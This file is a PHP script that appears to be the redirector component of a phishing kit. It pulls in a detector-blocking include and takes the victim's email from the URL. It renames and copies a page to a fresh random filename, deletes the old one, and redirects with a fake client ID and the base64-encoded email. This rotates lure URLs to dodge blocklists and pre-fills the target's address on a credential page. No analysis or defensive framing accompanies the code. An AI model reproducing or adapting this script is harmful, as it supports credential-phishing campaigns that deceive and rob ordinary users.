<?php
//error_reporting(0);
include('block_detectors.php');
if(isset($_GET['wa'])){
function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
//header('location:'.$url);


$email = $_GET['email'];

$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "off.php");
}}}
$staticfile = "off.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
$md5 = md5($email);
$md = substr($md5,0,4).wordwrap(substr($md5,4,24), 4, '-', true).substr($md5,24);
header("Location: $secfile?wa=1&client_id=$md&id=".base64_encode($email));
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
}
else{
	echo "You have no access to view this page.";
}
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
